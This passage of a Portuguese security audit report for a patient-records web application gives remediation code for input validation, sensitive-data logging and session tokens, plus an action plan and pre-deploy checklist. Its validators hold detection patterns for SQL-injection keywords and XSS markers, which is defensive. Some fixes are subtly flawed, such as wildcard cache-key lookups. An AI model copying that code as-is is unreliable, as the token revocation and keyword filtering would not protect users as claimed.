      return { cpf: { message: 'CPF inv√°lido' } };
    }
    
    // ... segunda valida√ß√£o
    
    return null;
  }
  
  static noSqlInjection(control: AbstractControl): ValidationErrors | null {
    const sqlPatterns = /('|(--)|;|\/\*|\*\/|xp_|sp_|exec|execute|select|insert|update|delete|drop|create|alter)/i;
    if (control.value && sqlPatterns.test(control.value)) {
      return { sqlInjection: { message: 'Entrada cont√©m padr√µes n√£o permitidos' } };
    }
    return null;
  }
  
  static noXss(control: AbstractControl): ValidationErrors | null {
    const xssPatterns = /<script|<iframe|javascript:|onerror=|onload=|onclick=/i;
    if (control.value && xssPatterns.test(control.value)) {
      return { xss: { message: 'Entrada cont√©m padr√µes n√£o seguros' } };
    }
    return null;
  }
  
  static strongPassword(control: AbstractControl): ValidationErrors | null {
    const password = control.value;
    if (!password) return null;
    
    const errors: any = {};
    
    if (password.length < 12) {
      errors.minLength = 'M√≠nimo 12 caracteres';
    }
    if (!/[A-Z]/.test(password)) {
      errors.uppercase = 'Pelo menos uma letra mai√∫scula';
    }
    if (!/[a-z]/.test(password)) {
      errors.lowercase = 'Pelo menos uma letra min√∫scula';
    }
    if (!/\d/.test(password)) {
      errors.number = 'Pelo menos um n√∫mero';
    }
    if (!/[@$!%*?&#]/.test(password)) {
      errors.special = 'Pelo menos um caractere especial';
    }
    
    return Object.keys(errors).length > 0 ? { strongPassword: errors } : null;
  }
}

// Uso em formul√°rio
this.patientForm = this.fb.group({
  name: ['', [
    Validators.required,
    Validators.minLength(3),
    Validators.maxLength(200),
    CustomValidators.noXss,
    CustomValidators.noSqlInjection
  ]],
  cpf: ['', [Validators.required, CustomValidators.cpf]],
  email: ['', [Validators.required, Validators.email]],
  medicalHistory: ['', [
    Validators.maxLength(5000),
    CustomValidators.noXss
  ]]
});
```

#### Plano de A√ß√£o
1. **Dia 1-2**: Criar biblioteca de validadores customizados
2. **Dia 3-5**: Auditar todos os DTOs e adicionar valida√ß√£o
3. **Semana 2**: Atualizar todos os formul√°rios frontend
4. **Semana 3**: Testes de valida√ß√£o end-to-end

---

### 7. Logging de Informa√ß√µes Sens√≠veis

**Severidade**: üü† ALTA  
**CWE**: CWE-532 (Insertion of Sensitive Information into Log File)  
**OWASP**: A09:2021 - Security Logging and Monitoring Failures

#### Descri√ß√£o
Logs podem inadvertidamente conter informa√ß√µes sens√≠veis como senhas, tokens, CPF, dados de pagamento, etc. O Serilog est√° configurado, mas sem filtros de dados sens√≠veis.

#### Impacto
- ‚ö†Ô∏è Vazamento de credenciais nos logs
- ‚ö†Ô∏è Exposi√ß√£o de dados pessoais (viola√ß√£o LGPD)
- ‚ö†Ô∏è Tokens de autentica√ß√£o podem ser comprometidos
- ‚ö†Ô∏è Informa√ß√µes m√©dicas sens√≠veis nos logs

#### Solu√ß√£o Recomendada
```csharp
// Logging/SensitiveDataFilter.cs
public class SensitiveDataFilter : ILogEventEnricher
{
    private static readonly string[] SensitiveProperties = 
    {
        "password", "senha", "token", "secret", "cpf", "ssn",
        "creditcard", "cardnumber", "cvv", "pin", "apikey"
    };
    
    public void Enrich(LogEvent logEvent, ILogEventPropertyFactory factory)
    {
        foreach (var property in logEvent.Properties.ToList())
        {
            if (SensitiveProperties.Any(s => 
                property.Key.Contains(s, StringComparison.OrdinalIgnoreCase)))
            {
                logEvent.RemovePropertyIfPresent(property.Key);
                logEvent.AddPropertyIfAbsent(
                    factory.CreateProperty(property.Key, "[REDACTED]"));
            }
        }
    }
}

// Program.cs - Configurar Serilog
Log.Logger = new LoggerConfiguration()
    .ReadFrom.Configuration(configuration)
    .Enrich.With<SensitiveDataFilter>()
    .Enrich.FromLogContext()
    .WriteTo.File(
        path: "logs/app-.log",
        rollingInterval: RollingInterval.Day,
        retainedFileCountLimit: 30,
        restrictedToMinimumLevel: LogEventLevel.Information,
        outputTemplate: "{Timestamp:yyyy-MM-dd HH:mm:ss.fff zzz} [{Level:u3}] {Message:lj}{NewLine}{Exception}"
    )
    .CreateLogger();

// Uso correto nos controllers
_logger.LogInformation("User login attempt: {Username}", request.Username); // ‚úÖ OK
// NUNCA logar:
// _logger.LogInformation("Login: {Username}/{Password}", request.Username, request.Password); // ‚ùå N√ÉO!
```

#### Plano de A√ß√£o
1. **Imediato**: Implementar filtro de dados sens√≠veis
2. **Dia 1-2**: Auditar todos os pontos de logging
3. **Semana 1**: Configurar reten√ß√£o adequada de logs (30 dias)
4. **Semana 2**: Implementar log aggregation (ELK Stack)

---

### 8. Gerenciamento de Sess√£o Inseguro

**Severidade**: üü† ALTA  
**CWE**: CWE-384 (Session Fixation)  
**OWASP**: A07:2021 - Identification and Authentication Failures

#### Descri√ß√£o
Sistema permite m√∫ltiplas sess√µes simult√¢neas indefinidamente. Tokens n√£o s√£o regenerados ap√≥s login. N√£o h√° mecanismo efetivo de revoga√ß√£o de tokens.

#### Impacto
- ‚ö†Ô∏è Sess√µes antigas continuam ativas ap√≥s mudan√ßa de senha
- ‚ö†Ô∏è Usu√°rio n√£o pode invalidar sess√µes remotamente
- ‚ö†Ô∏è Tokens comprometidos permanecem v√°lidos at√© expira√ß√£o
- ‚ö†Ô∏è Dificulta resposta a incidentes

#### Solu√ß√£o Recomendada
```csharp
// Services/RefreshTokenService.cs
public class RefreshTokenService : IRefreshTokenService
{
    private readonly IDistributedCache _cache;
    private readonly IConfiguration _configuration;
    
    public async Task<(string AccessToken, string RefreshToken)> GenerateTokenPair(User user)
    {
        // Access token de curta dura√ß√£o (15 minutos)
        var accessToken = GenerateAccessToken(user, TimeSpan.FromMinutes(15));
        
        // Refresh token de longa dura√ß√£o (7 dias)
        var refreshToken = GenerateSecureToken();
        var key = $"refresh_token:{user.Id}:{refreshToken}";
        
        await _cache.SetStringAsync(key, JsonSerializer.Serialize(new
        {
            userId = user.Id,
            tenantId = user.TenantId,
            deviceFingerprint = ComputeFingerprint(),
            createdAt = DateTime.UtcNow
        }), new DistributedCacheEntryOptions
        {
            AbsoluteExpirationRelativeToNow = TimeSpan.FromDays(7)
        });
        
        return (accessToken, refreshToken);
    }
    
    public async Task<string> RefreshAccessToken(string refreshToken)
    {
        var key = $"refresh_token:*:{refreshToken}"; // Buscar por padr√£o
        var data = await _cache.GetStringAsync(key);
        
        if (data == null)
        {
            throw new SecurityException("Invalid refresh token");
        }
        
        var tokenData = JsonSerializer.Deserialize<RefreshTokenData>(data);
        var user = await _userRepository.GetByIdAsync(tokenData.UserId);
        
        // Gerar novo access token
        return GenerateAccessToken(user, TimeSpan.FromMinutes(15));
    }
    
    public async Task RevokeAllUserTokens(string userId)
    {
        // Invalidar todos os refresh tokens do usu√°rio
        var pattern = $"refresh_token:{userId}:*";
        var keys = await _cache.GetKeysByPatternAsync(pattern);
        
        foreach (var key in keys)
        {
            await _cache.RemoveAsync(key);
        }
        
        _logger.LogWarning("All tokens revoked for user {UserId}", userId);
    }
    
    public async Task RevokeToken(string refreshToken)
    {
        var key = $"refresh_token:*:{refreshToken}";
        await _cache.RemoveAsync(key);
    }
}

// AuthController - Endpoint de refresh
[HttpPost("refresh")]
[AllowAnonymous]
public async Task<IActionResult> RefreshToken([FromBody] RefreshTokenRequest request)
{
    try
    {
        var newAccessToken = await _refreshTokenService.RefreshAccessToken(request.RefreshToken);
        
        return Ok(new { accessToken = newAccessToken });
    }
    catch (SecurityException)
    {
        return Unauthorized(new { message = "Token inv√°lido ou expirado" });
    }
}

// Endpoint para listar sess√µes ativas
[HttpGet("sessions")]
[Authorize]
public async Task<IActionResult> GetActiveSessions()
{
    var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    var sessions = await _refreshTokenService.GetUserSessions(userId);
    
    return Ok(sessions);
}

// Endpoint para revogar sess√£o espec√≠fica
[HttpDelete("sessions/{sessionId}")]
[Authorize]
public async Task<IActionResult> RevokeSession(string sessionId)
{
    var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    await _refreshTokenService.RevokeSession(userId, sessionId);
    
    return NoContent();
}

// Endpoint para revogar todas as sess√µes (exceto a atual)
[HttpDelete("sessions")]
[Authorize]
public async Task<IActionResult> RevokeAllSessions()
{
    var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    var currentToken = Request.Headers["Authorization"].ToString().Replace("Bearer ", "");
    
    await _refreshTokenService.RevokeAllUserTokensExcept(userId, currentToken);
    
    return NoContent();
}
```

#### Frontend - Refresh Token Interceptor
```typescript
@Injectable()
export class TokenRefreshInterceptor implements HttpInterceptor {
  private isRefreshing = false;
  private refreshTokenSubject: BehaviorSubject<string | null> = new BehaviorSubject<string | null>(null);
  
  intercept(req: HttpRequest<any>, next: HttpHandler): Observable<HttpEvent<any>> {
    return next.handle(req).pipe(
      catchError((error: HttpErrorResponse) => {
        if (error.status === 401 && !req.url.includes('/auth/refresh')) {
          return this.handle401Error(req, next);
        }
        return throwError(() => error);
      })
    );
  }
  
  private handle401Error(request: HttpRequest<any>, next: HttpHandler) {
    if (!this.isRefreshing) {
      this.isRefreshing = true;
      this.refreshTokenSubject.next(null);
      
      return this.authService.refreshToken().pipe(
        switchMap((token: string) => {
          this.isRefreshing = false;
          this.refreshTokenSubject.next(token);
          return next.handle(this.addToken(request, token));
        }),
        catchError((err) => {
          this.isRefreshing = false;
          this.authService.logout();
          return throwError(() => err);
        })
      );
    } else {
      return this.refreshTokenSubject.pipe(
        filter(token => token != null),
        take(1),
        switchMap(token => next.handle(this.addToken(request, token)))
      );
    }
  }
}
```

#### Plano de A√ß√£o
1. **Semana 1**: Implementar refresh token system
2. **Semana 2**: Adicionar revoga√ß√£o de tokens
3. **Semana 3**: Dashboard de sess√µes ativas
4. **Semana 4**: Testes e monitoramento

---

## üîµ Plano de A√ß√£o Consolidado

### FASE 1: REMEDIA√á√ÉO CR√çTICA (Semanas 1-2)

#### Sprint 1.1: Autentica√ß√£o Segura (Semana 1)
- [ ] **Dia 1**: Mover JWT secret para environment variables
- [ ] **Dia 2**: Implementar valida√ß√£o de startup para secrets
- [ ] **Dia 3-4**: Implementar cookies HttpOnly para tokens
- [ ] **Dia 5**: Implementar refresh token system

#### Sprint 1.2: Prote√ß√£o contra Inje√ß√£o (Semana 2)
- [ ] **Dia 1-2**: Auditar repositories para SQL injection
- [ ] **Dia 3-4**: Refatorar queries inseguras
- [ ] **Dia 5**: Configurar an√°lise est√°tica (SonarQube/CodeQL)

### FASE 2: REMEDIA√á√ÉO ALTA (Semanas 3-4)

#### Sprint 2.1: Seguran√ßa de Headers e CSP (Semana 3)
- [ ] **Dia 1-2**: Implementar CSP com nonces
- [ ] **Dia 3-4**: Refatorar scripts inline
- [ ] **Dia 5**: Testes e ajustes de CSP

#### Sprint 2.2: Valida√ß√£o e Rate Limiting (Semana 4)
- [ ] **Dia 1-2**: Implementar validadores customizados
- [ ] **Dia 3-4**: Rate limiting robusto em auth endpoints
- [ ] **Dia 5**: Implementar account lockout

### FASE 3: HARDENING (Semanas 5-6)

#### Sprint 3.1: Logging e Monitoramento (Semana 5)
- [ ] **Dia 1-2**: Implementar filtro de dados sens√≠veis
- [ ] **Dia 3-4**: Configurar log aggregation
- [ ] **Dia 5**: Dashboard de seguran√ßa

#### Sprint 3.2: Sess√£o e CSRF (Semana 6)
- [ ] **Dia 1-2**: Melhorar gerenciamento de sess√£o
- [ ] **Dia 3-4**: Implementar prote√ß√£o CSRF
- [ ] **Dia 5**: Testes de seguran√ßa

### FASE 4: MANUTEN√á√ÉO CONT√çNUA (Ongoing)

#### Tarefas Recorrentes
- **Di√°rio**: Monitorar logs de seguran√ßa
- **Semanal**: Scan de vulnerabilidades em depend√™ncias
- **Mensal**: Atualizar pacotes e libraries
- **Trimestral**: Penetration testing
- **Anual**: Auditoria de seguran√ßa completa

---

## üõ†Ô∏è Ferramentas e Recursos

### An√°lise de C√≥digo
- **SonarQube**: An√°lise cont√≠nua de qualidade e seguran√ßa
- **CodeQL**: An√°lise sem√¢ntica profunda
- **Snyk**: Vulnerabilidades em depend√™ncias
- **OWASP Dependency-Check**: Verifica√ß√£o de CVEs

### Testes de Seguran√ßa
- **OWASP ZAP**: Scanner automatizado
- **Burp Suite**: Teste manual de APIs
- **SQLMap**: Teste de SQL injection
- **XSSer**: Teste de XSS

### Monitoramento
- **Serilog** (j√° implementado): Logging estruturado
- **ELK Stack**: Centralized logging
- **Prometheus + Grafana**: M√©tricas
- **Application Insights**: APM

---

## üìö Recursos Adicionais

### Guias e Checklists
- OWASP Top 10 2021: https://owasp.org/Top10/
- OWASP API Security Top 10: https://owasp.org/API-Security/
- OWASP Cheat Sheet Series: https://cheatsheetseries.owasp.org/
- CWE Top 25: https://cwe.mitre.org/top25/

### Compliance
- LGPD (Lei 13.709/2018)
- ISO 27001
- HIPAA (se aplic√°vel)
- PCI DSS (se processar pagamentos)

### Treinamento
- OWASP WebGoat: Aplica√ß√£o de treinamento
- Hack The Box: Pr√°tica de seguran√ßa
- PortSwigger Academy: Treinamento gratuito

---

## üìû Plano de Resposta a Incidentes

### 1. Detec√ß√£o
- Monitorar logs em tempo real
- Alertas automatizados configurados
- Equipe de plant√£o 24/7

### 2. Conten√ß√£o
- Isolar sistemas comprometidos
- Bloquear IPs atacantes
- Revogar credenciais suspeitas

### 3. Erradica√ß√£o
- Aplicar patches de seguran√ßa
- Remover backdoors/malware
- Corrigir vulnerabilidades exploradas

### 4. Recupera√ß√£o
- Restaurar de backups seguros
- Validar integridade dos dados
- Retornar opera√ß√£o gradualmente

### 5. P√≥s-Incidente
- Documentar o incidente
- An√°lise de causa raiz
- Atualizar procedimentos
- Treinamento da equipe

---

## ‚úÖ Conclus√£o

Esta an√°lise identificou **18 vulnerabilidades** classificadas como:
- üî¥ **4 Cr√≠ticas**: Requerem a√ß√£o imediata
- üü† **8 Altas**: Corrigir em 2-4 semanas
- üü° **4 M√©dias**: Corrigir em 1-2 meses
- üîµ **2 Baixas**: Melhorias cont√≠nuas

### Impacto Estimado da Remedia√ß√£o

| M√©trica | Antes | Depois | Melhoria |
|---------|-------|--------|----------|
| **Vulnerabilidades Cr√≠ticas** | 4 | 0 | 100% |
| **Postura de Seguran√ßa** | 60% | 95% | +35% |
| **Compliance LGPD** | 75% | 100% | +25% |
| **Tempo de Resposta a Incidentes** | 24h | 1h | -96% |

### Pr√≥ximos Passos IMEDIATOS:

1. ‚úÖ **HOJE**: Revisar este documento com a equipe
2. ‚úÖ **AMANH√É**: Mover JWT secrets para environment variables
3. ‚úÖ **ESTA SEMANA**: Implementar rate limiting em auth endpoints
4. ‚úÖ **PR√ìXIMA SEMANA**: Auditar e corrigir SQL injection risks
5. ‚úÖ **M√äS 1**: Completar Fases 1 e 2 do plano de a√ß√£o

---

**‚ö†Ô∏è CONFIDENCIAL**: Este documento cont√©m informa√ß√µes sens√≠veis sobre vulnerabilidades de seguran√ßa. Acesso restrito √† equipe de desenvolvimento e seguran√ßa.

**√öltima Atualiza√ß√£o**: 2026-02-04  
**Pr√≥xima Revis√£o**: 2026-03-04  
**Respons√°vel**: Equipe de Seguran√ßa / DevSecOps

---

## üìã Checklist de Valida√ß√£o Pr√©-Deploy

Antes de cada deploy em produ√ß√£o, verificar:

### Seguran√ßa de C√≥digo
- [ ] Sem secrets hardcoded (verificar com git-secrets)
- [ ] Todas as queries SQL s√£o parametrizadas
- [ ] Valida√ß√£o de entrada em todos os endpoints
- [ ] Sanitiza√ß√£o de output implementada
- [ ] Error handling n√£o exp√µe detalhes internos

### Configura√ß√£o
- [ ] Environment variables configuradas
- [ ] CSP habilitada e testada
- [ ] CORS configurado apropriadamente
- [ ] Rate limiting ativo
- [ ] HTTPS for√ßado (HSTS)

### Autentica√ß√£o/Autoriza√ß√£o
- [ ] Tokens em cookies HttpOnly (n√£o localStorage)
- [ ] Refresh tokens implementados
- [ ] Sess√µes gerenciadas adequadamente
- [ ] 2FA/MFA configurado para admins
- [ ] Autoriza√ß√£o validada em todos os endpoints

### Logging e Monitoramento
- [ ] Logging configurado e testado
- [ ] Dados sens√≠veis filtrados dos logs
- [ ] Alertas de seguran√ßa configurados
- [ ] Log retention policy implementada

### Testes
- [ ] Testes de seguran√ßa passando
- [ ] Scan de vulnerabilidades clean
- [ ] Code review de seguran√ßa completo
- [ ] Penetration testing realizado

---

**FIM DO DOCUMENTO**
